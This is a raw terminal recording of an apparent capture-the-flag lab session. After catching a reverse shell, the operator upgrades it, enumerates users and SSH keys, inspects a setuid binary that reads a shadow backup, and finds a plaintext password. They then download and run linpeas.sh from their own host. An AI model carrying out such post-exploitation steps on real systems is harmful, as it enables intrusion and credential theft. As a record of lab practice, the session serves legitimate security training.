Script started on 2021-04-03 21:14:22+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="203" LINES="53"]
]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.86.202 45076
bash: cannot set terminal process group (703): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 9999
]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ stty raw -echo
]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ nc -lvnp 9999
reset
reset: unknown terminal type unknown
Terminal type? xterm-256color
[3g        H        H        H        H        H        H        H        H        Hc[!p[?3;4l[4l>www-data@ubuntu:/var/www/html$ echo $TERM
dumb
www-data@ubuntu:/var/www/html$ expot=r   rt $TERM              ls
2591c98b70119fe624898b1e424b5e91.php  administrator.php  index.html
www-data@ubuntu:/var/www/html$ lsecho $TERMls          clear
TERM environment variable not set.
www-data@ubuntu:/var/www/html$ reset
reset: unknown terminal type unknown
Terminal type? xterm
[3g        H        H        H        H        H        H        H        H        Hc[!p[?3;4l[4l>www-data@ubuntu:/var/www/html$ ls
2591c98b70119fe624898b1e424b5e91.php  administrator.php  index.html
www-data@ubuntu:/var/www/html$ ls
2591c98b70119fe624898b1e424b5e91.php  administrator.php  index.html
www-data@ubuntu:/var/www/html$ clear
TERM environment variable not set.
www-data@ubuntu:/var/www/html$ export TERM=xterm
www-data@ubuntu:/var/www/html$ export SHELL=bash
www-data@ubuntu:/var/www/html$ ls
2591c98b70119fe624898b1e424b5e91.php  administrator.php  index.html
www-data@ubuntu:/var/www/html$ clear
[3;J[H[2Jwww-data@ubuntu:/var/www/html$ echo $TERM
xterm
www-data@ubuntu:/var/www/html$ cla ear
[3;J[H[2Jwww-data@ubuntu:/var/www/html$ ls -la
total 28
drwxr-xr-x 2 root root  4096 Jan 16  2020 .
drwxr-xr-x 3 root root  4096 Jan 15  2020 ..
-rw-rw-r-- 1 root root   378 Jan 15  2020 2591c98b70119fe624898b1e424b5e91.php
-rw-r--r-- 1 root root  1282 Jan 15  2020 administrator.php
-rw-r--r-- 1 root root 10918 Jan 15  2020 index.html
www-data@ubuntu:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
papa:x:1000:1000:qaa:/home/papa:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
pingu:x:1002:1002::/home/pingu:/bin/bash
www-data@ubuntu:/var/www/html$ cd /home/
www-data@ubuntu:/home$ ls
papa  pingu
www-data@ubuntu:/home$ cd pingu/
www-data@ubuntu:/home/pingu$ ls
www-data@ubuntu:/home/pingu$ ls -la
total 32
drwxrwxrwx 6 pingu pingu 4096 Jan 20  2020 .
drwxr-xr-x 4 root  root  4096 Jan 15  2020 ..
lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 .bash_history -> /dev/null
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .cache
-rw------- 1 pingu pingu 1852 Jan 20  2020 .gdb_history
-rw-r--r-- 1 root  root    36 Jan 16  2020 .gdbinit
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .nano
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .pwntools-cache-2.7
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .ssh
www-data@ubuntu:/home/pingu$ cd .ssh/
www-data@ubuntu:/home/pingu/.ssh$ ls -la
total 16
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .
drwxrwxrwx 6 pingu pingu 4096 Jan 20  2020 ..
-rwxrwxrwx 1 pingu pingu 1675 Jan 15  2020 id_rsa
-rwxrwxrwx 1 pingu pingu  394 Jan 15  2020 id_rsa.pub
www-data@ubuntu:/home/pingu/.ssh$ cd ..
www-data@ubuntu:/home/pingu$ cd ..
www-data@ubuntu:/home$ ls
papa  pingu
www-data@ubuntu:/home$ cd papa
www-data@ubuntu:/home/papa$ ls -la
total 36
drwxr-xr-x 5 papa papa 4096 Jan 15  2020 .
drwxr-xr-x 4 root root 4096 Jan 15  2020 ..
-rw------- 1 papa papa  627 Jan 16  2020 .bash_history
-rw-r--r-- 1 papa papa  220 Jan 15  2020 .bash_logout
-rw-r--r-- 1 papa papa 3771 Jan 15  2020 .bashrc
drwx------ 2 papa papa 4096 Jan 15  2020 .cache
drwxrwxr-x 2 papa papa 4096 Jan 15  2020 .nano
-rw-r--r-- 1 papa papa  655 Jan 15  2020 .profile
drwxrwxr-x 2 papa papa 4096 Jan 15  2020 .pwntools-cache-2.7
-rw-r--r-- 1 papa papa    0 Jan 15  2020 .sudo_as_admin_successful
www-data@ubuntu:/home/papa$ cd ..
www-data@ubuntu:/home$ id' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/home$ sd udo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 1 incorrect password attempt
www-data@ubuntu:/home$ su pingudada 
No passwd entry for user 'pingudad'
www-data@ubuntu:/home$ su pingu
Password: 
su: Authentication failure
www-data@ubuntu:/home$ find / -name   ""a"s"s"[1P"[1P"[1P"p"a"s"s"w"o"r"d"" >2/dev/null
bash: 2/dev/null: No such file or directory
www-data@ubuntu:/home$ find / -name "password" >2/dev/null[1@/
bash: /2/dev/null: No such file or directory
www-data@ubuntu:/home$ find / -name "password" >/2/dev/null            2>/dev/null
/var/lib/pam/password
www-data@ubuntu:/home$ cat /var/lib/pam/password
Module: unix
[success=end default=ignore]	pam_unix.so obscure sha512
www-data@ubuntu:/home$ man dind    find / -user pingu 2>/dev/null
[?1049h[?1h=FIND(1)                     General Commands Manual                    FIND(1)[m
[m
[1mNAME[0m[m
       find - search for files in a directory hierarchy[m
[m
[1mSYNOPSIS[0m[m
       [1mfind[0m  [-H]  [-L]  [-P]  [-D  debugopts]  [-Olevel]  [starting-point...][m
       [expression][m
[m
[1mDESCRIPTION[0m[m
       This manual page documents the GNU version of [1mfind[0m.  GNU [1mfind[0m  searches[m
       the  directory  tree  rooted at each given starting-point by evaluating[m
       the given expression from left to right,  according  to  the  rules  of[m
       precedence  (see  section  OPERATORS),  until the outcome is known (the[m
       left hand side is false for [4mand[24m operations,  true  for  [4mor[24m),  at  which[m
       point  [1mfind[0m  moves  on  to the next file name.  If no starting-point is[m
       specified, `.' is assumed.[m
[m
       If you are using [1mfind[0m in an environment  where  security  is  important[m
       (for  example  if  you  are  using  it  to  search directories that are[m
       writable by other users), you should read the "Security Considerations"[m
       chapter  of  the findutils documentation, which is called [1mFinding[0m [1mFiles[0m[m
       and comes with findutils.   That document  also  includes  a  lot  more[m
[7m Manual page find(1) line 1 (press h for help or q to quit)[27m[K[K[?1l>[?1049lwww-data@ubuntu:/home$ man find / -user pingu 2>/dev/nulln [1P[1P[1P[1P
/home/pingu
/home/pingu/.bash_history
/home/pingu/.cache
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.ssh
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/home/pingu/.nano
/home/pingu/.gdb_history
/home/pingu/.pwntools-cache-2.7
/home/pingu/.pwntools-cache-2.7/update
www-data@ubuntu:/home$ find / -user pingu 2>/dev/null[1P[1P[1P[1P[1P[1@p[1@a[1@p[1@a
/opt/secret
/home/papa
/home/papa/.bash_history
/home/papa/.bash_logout
/home/papa/.cache
/home/papa/.profile
/home/papa/.nano
/home/papa/.bashrc
/home/papa/.sudo_as_admin_successful
/home/papa/.pwntools-cache-2.7
/home/papa/.pwntools-cache-2.7/update
/var/backups/shadow.bak
www-data@ubuntu:/home$ cat /opt/secret
cat: /opt/secret: Is a directory
www-data@ubuntu:/home$ cat /opt/secretat[1P[1P[1@d
www-data@ubuntu:/opt/secret$ ls -la
total 16
drwxrwxrwx 2 papa adm  4096 Jan 16  2020 .
drwxrwxrwx 3 root root 4096 Jan 15  2020 ..
-r-sr-xr-x 1 root papa 7516 Jan 16  2020 root
www-data@ubuntu:/opt/secret$ cat root 
ELF              –É4   Ñ      4   	 (      4   4Ä4Ä               T  TÅTÅ                    Ä Ä8  8             üü   $             üüË   Ë            h  hÅhÅD   D         PÂtd  ÖÖ<   <         QÂtd                          RÂtd  üü¯   ¯         /lib/ld-linux.so.2           GNU                        GNU ØA«*LèMrÕØ§u6È&W≤                       ≠K„¿                7              0              P               >                            !                 ÃÖ      libc.so.6 _IO_stdin_used setuid __isoc99_scanf system setgid __libc_start_main __gmon_start__ GLIBC_2.7 GLIBC_2.0                        ii   _      ii   i       ¸ü  †  †  †  †  †  SÉÏË«   Å√«  ãÉ¸ˇˇˇÖ¿tËr   Éƒ[√             ˇ5†ˇ%†    ˇ%†h    È‡ˇˇˇˇ%†h   È–ˇˇˇˇ%†h   È¿ˇˇˇˇ%†h   È∞ˇˇˇˇ%†h    È†ˇˇˇˇ%¸üfê        1Ì^â·É‰PTRh∞ÖhPÖQVh!ÖËüˇˇˇÙfêfêfêfêfêfêfêã$√fêfêfêfêfêfê∏+†-(†É¯v∏    Ö¿tUâÂÉÏh(†ˇ–Éƒ…Û√êçt& ∏(†-(†¡¯â¬¡Í–—¯t∫    Ö“tUâÂÉÏPh(†ˇ“Éƒ…Û√çt& çº'    Ä=(† uUâÂÉÏË|ˇˇˇ∆(†…Û√fê∏üãÖ“uÎìçv ∫    Ö“tÚUâÂÉÏPˇ“Éƒ…ÈuˇˇˇUâÂÉÏÉÏhË  Ë¬˛ˇˇÉƒÉÏhË  ËÇ˛ˇˇÉƒÉÏh–ÖËÇ˛ˇˇÉƒê…√UâÂÉÏ(ÉÏçEÿPhÏÖËï˛ˇˇÉƒê…√çL$É‰ˇq¸UâÂQÉÏËÕˇˇˇ∏    ÉƒY]ça¸√fêfêfêfêfêêUWVSËß˛ˇˇÅ√ß  ÉÏãl$ ç≥ˇˇˇËø˝ˇˇçÉˇˇˇ)∆¡˛Öˆt%1ˇç∂    ÉÏˇt$,ˇt$,UˇîªˇˇˇÉ«Éƒ9˜u„Éƒ[^_]√çv Û√  SÉÏËC˛ˇˇÅ√C  Éƒ[√     cat /var/backups/shadow.bak %s  ;8      p˝ˇˇT   €˛ˇˇx   ˇˇˇò   1ˇˇˇ∏   `ˇˇˇ‰   ¿ˇˇˇ0         zR |à         ˝ˇˇ`    FJtx ?;*2$"   @   [˛ˇˇ9    AÖBu≈     `   t˛ˇˇ    AÖBY≈  (   Ä   q˛ˇˇ$    D Gu Cu|Q¡ A≈CH   ¨   t˛ˇˇ]    AÖAáAÜAÉN i$D(D,A0M GA√A∆A«A≈     ¯   à˛ˇˇ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           †ÑÄÑ             0É   ¥Ö   ü         ü      ı˛ˇo¨Å   LÇ   ÃÅ
   s                    †   (            É    É            ˛ˇˇo–Çˇˇˇo   ˇˇo¿Ç                                                    ü        vÉÜÉñÉ¶É∂É        GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609                        TÅ          hÅ          àÅ          ¨Å          ÃÅ          LÇ          ¿Ç          –Ç           É     	     É     
     0É          `É          ¿É          –É          ¥Ö          »Ö          Ö          ,Ü          ü          ü          ü          ü          ¸ü           †           †          (†                                Òˇ   ü         Ñ         @Ñ      .   ÄÑ      D   (†     S   ü      z   †Ñ      Ü   ü      •            Òˇ            Òˇ©   4á      ∑   ü                   Òˇ√   ü       ‘   ü      ›   ü          Ö          †        ∞Ö     )              E   Ñ    d   †       [  (†      #  ¥Ö      b   †      o             Å             ì              ¢  $†     Ø  ÃÖ     æ             €  PÖ]     œ   ,†      h  –É      Î  »Ö     Ú  (†      ˛  !Ö$                                )             C  (†     O              i  ÀÑ9     Â  0É      o  Ö      crtstuff.c __JCR_LIST__ deregister_tm_clones __do_global_dtors_aux completed.7209 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry a.c __FRAME_END__ __JCR_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable __x86.get_pc_thunk.bx _edata __data_start setgid@@GLIBC_2.0 system@@GLIBC_2.0 __gmon_start__ __dso_handle _IO_stdin_used __libc_start_main@@GLIBC_2.0 __libc_csu_init _fp_hw __bss_start main setuid@@GLIBC_2.0 _Jv_RegisterClasses __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable shell get_input  .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .jcr .dynamic .got.plt .data .bss .comment                                                   TÅT                    #         hÅh                     1         àÅà  $                  D   ˆˇˇo   ¨Å¨                   N         ÃÅÃ  Ä               V         LÇL  s                  ^   ˇˇˇo   ¿Ç¿                  k   ˛ˇˇo   –Ç–  0                z   	       É                   É   	   B   É  (               å         0É0  #                  á         `É`  `                 í         ¿É¿                    õ         –É–  ‚                 °         ¥Ö¥                    ß         »Ö»  '                  Ø         Ö  <                  Ω         ,Ü,                   «         ü                    ”         ü                    ﬂ         ü                    ‰         ü  Ë                ñ         ¸ü¸                   Ì          †                     ˆ          †                     ¸         (†(                         0       (  5                               y  
                               `  †     /         	                 y                 www-data@ubuntu:/opt/secret$ 
www-data@ubuntu:/opt/secret$ 
www-data@ubuntu:/opt/secret$ di  file root 
root: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af41c72a4c8f1a4d720315cdafa47536e92657b2, not stripped
www-data@ubuntu:/opt/secret$ ./root 
whoami
www-data@ubuntu:/opt/secret$ whoami
www-data
www-data@ubuntu:/opt/secret$ stringss    s root 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
__isoc99_scanf
system
setgid
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.0
PTRh
QVh!
UWVS
t$,U
[^_]
cat /var/backups/shadow.bak
;*2$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7209
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
_edata
__data_start
setgid@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_fp_hw
__bss_start
main
setuid@@GLIBC_2.0
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
shell
get_input
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
www-data@ubuntu:/opt/secret$ strings root [7Pwhoami./root [3@file root [1Pcat root [3Pls -lacd /opt/secret[1@at /opt/secretfind / -user papa 2>/dev/null
/opt/secret
/home/papa
/home/papa/.bash_history
/home/papa/.bash_logout
/home/papa/.cache
/home/papa/.profile
/home/papa/.nano
/home/papa/.bashrc
/home/papa/.sudo_as_admin_successful
/home/papa/.pwntools-cache-2.7
/home/papa/.pwntools-cache-2.7/update
/var/backups/shadow.bak
www-data@ubuntu:/opt/secret$ cat /var/backups/shadow.bak
cat: /var/backups/shadow.bak: Permission denied
www-data@ubuntu:/opt/secret$ sudo -l
[sudo] password for www-data: 
www-data@ubuntu:/opt/secret$ cd /var/
www-data@ubuntu:/var$ ls
backups  cache	hidden	lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@ubuntu:/var$ cd hidden/
www-data@ubuntu:/var/hidden$ ls
pass
www-data@ubuntu:/var/hidden$ cat pass 
pinguapingu
www-data@ubuntu:/var/hidden$ cd /tmp
www-data@ubuntu:/tmp$ wget 10.9.3.85:8000/linpeas.sh
--2021-04-03 09:33:19--  http://10.9.3.85:8000/linpeas.sh
Connecting to 10.9.3.85:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325334 (318K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh            0%[                    ]       0  --.-KB/s               linpeas.sh            3%[                    ]  12.46K  61.7KB/s               linpeas.sh           11%[=>                  ]  37.38K  91.9KB/s               linpeas.sh           27%[====>               ]  86.43K   141KB/s               linpeas.sh           58%[==========>         ] 187.36K   229KB/s               linpeas.sh           94%[=================>  ] 300.76K   168KB/s               linpeas.sh           95%[==================> ] 304.50K   136KB/s               linpeas.sh           96%[==================> ] 305.74K   125KB/s               linpeas.sh          100%[===================>] 317.71K   120KB/s    in 2.6s    

2021-04-03 09:33:22 (120 KB/s) - 'linpeas.sh' saved [325334/325334]

www-data@ubuntu:/tmp$ chmod +x linpeas.sh 
www-data@ubuntu:/tmp$ ./linpeas.sh 


                     [48;2;194;194;194m[38;2;26;43;21m‚ñÑ[48;2;159;158;159m[38;2;58;91;50m‚ñÑ[48;2;130;130;130m[38;2;68;119;56m‚ñÑ[48;2;116;117;116m[38;2;86;143;70m‚ñÑ[48;2;98;98;98m[38;2;100;153;87m‚ñÑ[48;2;63;65;63m[38;2;102;164;86m‚ñÑ[48;2;46;49;44m[38;2;98;168;79m‚ñÑ[48;2;43;45;43m[38;2;91;155;75m‚ñÑ[48;2;61;62;61m[38;2;78;137;63m‚ñÑ[48;2;102;101;102m[38;2;64;112;52m‚ñÑ[48;2;134;134;134m[38;2;38;67;32m‚ñÑ[48;2;164;164;164m[38;2;20;35;16m‚ñÑ[48;2;188;187;188m[38;2;10;20;8m‚ñÑ[48;2;223;223;223m[38;2;15;21;13m‚ñÑ[0m
             [48;2;230;230;230m[38;2;49;80;41m‚ñÑ[48;2;132;132;133m[38;2;73;133;59m‚ñÑ[48;2;20;21;20m[38;2;91;163;72m‚ñÑ[48;2;14;27;12m[38;2;96;174;76m‚ñÑ[48;2;51;92;41m[38;2;98;177;78m‚ñÑ[48;2;86;155;68m[38;2;98;177;78m‚ñÑ[48;2;96;173;77m[38;2;98;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m‚ñÑ[48;2;97;175;76m[38;2;98;177;78m‚ñÑ[48;2;93;168;74m[38;2;98;177;78m‚ñÑ[48;2;99;163;83m[38;2;97;177;77m‚ñÑ[48;2;99;151;86m[38;2;98;177;78m‚ñÑ[48;2;35;57;29m[38;2;98;176;78m‚ñÑ[48;2;19;21;19m[38;2;94;169;75m‚ñÑ[48;2;118;118;118m[38;2;70;125;56m‚ñÑ[48;2;234;234;234m[38;2;30;45;26m‚ñÑ[0m
      [48;2;216;216;216m[38;2;42;65;36m‚ñÑ[48;2;159;159;159m[38;2;62;106;52m‚ñÑ[48;2;94;95;94m[38;2;86;152;70m‚ñÑ[48;2;57;72;53m[38;2;96;174;77m‚ñÑ[48;2;57;96;47m[38;2;98;177;78m‚ñÑ[48;2;78;136;62m[38;2;98;177;78m‚ñÑ[48;2;95;167;76m[38;2;98;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;77m‚ñÑ[48;2;98;177;78m[38;2;91;165;72m‚ñÑ[48;2;98;177;78m[38;2;76;137;60m‚ñÑ[48;2;98;177;78m[38;2;54;97;42m‚ñÑ[48;2;99;179;79m[38;2;39;71;30m‚ñÑ[48;2;100;181;79m[38;2;35;60;30m‚ñÑ[48;2;101;181;81m[38;2;42;66;37m‚ñÑ[48;2;100;177;80m[38;2;52;73;45m‚ñÑ[48;2;95;175;76m[38;2;47;75;40m‚ñÑ[48;2;94;178;73m[38;2;41;75;33m‚ñÑ[48;2;98;179;78m[38;2;42;73;34m‚ñÑ[48;2;99;180;79m[38;2;40;70;33m‚ñÑ[48;2;99;179;78m[38;2;44;75;36m‚ñÑ[48;2;97;177;77m[38;2;55;93;46m‚ñÑ[48;2;97;176;77m[38;2;65;113;52m‚ñÑ[48;2;98;177;78m[38;2;79;141;63m‚ñÑ[48;2;98;177;78m[38;2;93;166;75m‚ñÑ[48;2;98;177;78m[38;2;99;177;79m‚ñÑ[48;2;98;177;78m[38;2;97;177;78m‚ñÑ[48;2;98;177;78m[38;2;97;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;94;170;75m[38;2;98;177;78m‚ñÑ[48;2;71;128;56m[38;2;98;177;78m‚ñÑ[48;2;34;56;28m[38;2;97;175;77m‚ñÑ[48;2;64;66;64m[38;2;78;140;62m‚ñÑ[48;2;161;161;161m[38;2;48;84;39m‚ñÑ[0m
  [48;2;66;112;54m[38;2;98;177;78m‚ñÑ[48;2;80;133;66m[38;2;98;177;78m‚ñÑ[48;2;95;162;76m[38;2;98;177;78m‚ñÑ[48;2;96;171;76m[38;2;98;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m[38;2;97;176;77m‚ñÑ[48;2;98;177;78m[38;2;96;174;76m‚ñÑ[48;2;98;177;78m[38;2;74;130;59m‚ñÑ[48;2;98;176;78m[38;2;32;49;27m‚ñÑ[48;2;95;166;76m[38;2;18;29;15m‚ñÑ[48;2;73;126;59m[38;2;65;113;53m‚ñÑ[48;2;40;62;34m[38;2;107;209;83m‚ñÑ[48;2;23;43;19m[38;2;77;220;42m‚ñÑ[48;2;32;72;22m[38;2;72;218;36m‚ñÑ[48;2;55;155;30m[38;2;73;217;37m‚ñÑ[48;2;71;203;38m[38;2;73;217;37m‚ñÑ[48;2;79;212;46m[38;2;73;218;37m‚ñÑ[48;2;81;216;48m[38;2;73;218;37m‚ñÑ[48;2;82;220;48m[38;2;73;218;37m‚ñÑ[48;2;79;221;44m[38;2;73;218;37m‚ñÑ[48;2;76;219;40m[38;2;73;218;37m‚ñÑ[48;2;76;218;40m[38;2;73;218;37m‚ñÑ[48;2;75;213;41m[38;2;73;218;37m‚ñÑ[48;2;79;203;48m[38;2;73;218;37m‚ñÑ[48;2;76;175;52m[38;2;73;218;37m‚ñÑ[48;2;52;127;33m[38;2;73;218;37m‚ñÑ[48;2;29;75;18m[38;2;73;217;37m‚ñÑ[48;2;19;45;12m[38;2;73;218;36m‚ñÑ[48;2;45;74;38m[38;2;65;196;33m‚ñÑ[48;2;76;127;62m[38;2;44;132;24m‚ñÑ[48;2;90;158;72m[38;2;16;45;10m‚ñÑ[48;2;97;175;77m[38;2;28;50;22m‚ñÑ[48;2;98;177;78m[38;2;80;145;64m‚ñÑ[48;2;98;177;78m[38;2;97;175;77m‚ñÑ[48;2;98;177;78m[38;2;97;176;77m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m‚ñÑ[48;2;98;177;78m[38;2;98;177;77m‚ñÑ[48;2;97;173;78m[38;2;98;177;78m‚ñÑ[48;2;69;114;56m[38;2;98;177;78m‚ñÑ[48;2;30;38;28m[38;2;103;179;83m‚ñÑ[48;2;91;91;91m[38;2;99;149;87m‚ñÑ[48;2;188;188;188m[38;2;39;53;36m‚ñÑ[0m
  [48;2;98;177;78m[38;2;98;177;77m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;178;78m‚ñÑ[48;2;98;177;78m[38;2;98;178;78m‚ñÑ[48;2;98;177;78m[38;2;83;150;66m‚ñÑ[48;2;98;177;78m[38;2;44;80;34m‚ñÑ[48;2;99;179;78m[38;2;33;49;28m‚ñÑ[48;2;87;159;69m[38;2;68;97;61m‚ñÑ[48;2;46;84;37m[38;2;87;165;68m‚ñÑ[48;2;25;37;21m[38;2;83;208;52m‚ñÑ[48;2;59;131;42m[38;2;73;219;37m‚ñÑ[48;2;74;199;43m[38;2;74;223;37m‚ñÑ[48;2;72;213;38m[38;2;67;204;35m‚ñÑ[48;2;73;218;37m[38;2;55;171;29m‚ñÑ[48;2;72;218;36m[38;2;59;136;22m‚ñÑ[48;2;72;218;36m[38;2;103;132;15m‚ñÑ[48;2;73;219;37m[38;2;149;133;9m‚ñÑ[48;2;72;220;37m[38;2;168;130;7m‚ñÑ[48;2;73;220;37m[38;2;167;118;5m‚ñÑ[48;2;72;218;37m[38;2;106;78;4m‚ñÑ[48;2;69;210;36m[38;2;93;69;4m‚ñÑ[48;2;66;199;34m[38;2;173;117;4m‚ñÑ[48;2;63;192;32m[38;2;177;119;4m‚ñÑ[48;2;62;186;32m[38;2;173;116;4m‚ñÑ[48;2;61;186;31m[38;2;176;115;4m‚ñÑ[48;2;63;191;32m[38;2;174;115;4m‚ñÑ[48;2;67;202;34m[38;2;170;113;4m‚ñÑ[48;2;70;213;36m[38;2;180;118;3m‚ñÑ[48;2;72;219;37m[38;2;175;117;4m‚ñÑ[48;2;73;220;37m[38;2;154;120;7m‚ñÑ[48;2;73;220;37m[38;2;80;94;11m‚ñÑ[48;2;73;219;37m[38;2;48;93;15m‚ñÑ[48;2;73;218;37m[38;2;41;112;19m‚ñÑ[48;2;72;215;36m[38;2;45;144;25m‚ñÑ[48;2;64;192;32m[38;2;63;191;32m‚ñÑ[48;2;32;99;16m[38;2;73;218;37m‚ñÑ[48;2;21;41;16m[38;2;72;210;38m‚ñÑ[48;2;38;66;30m[38;2;67;177;41m‚ñÑ[48;2;79;141;63m[38;2;53;123;36m‚ñÑ[48;2;98;178;78m[38;2;32;57;25m‚ñÑ[48;2;98;179;77m[38;2;25;46;20m‚ñÑ[48;2;97;177;77m[38;2;56;100;46m‚ñÑ[48;2;98;177;78m[38;2;93;165;75m‚ñÑ[48;2;97;176;77m[38;2;100;181;80m‚ñÑ[48;2;98;177;77m[38;2;97;176;76m‚ñÑ[48;2;97;176;78m[38;2;98;177;78m‚ñÑ[48;2;99;174;79m[38;2;98;177;78m‚ñÑ[0m
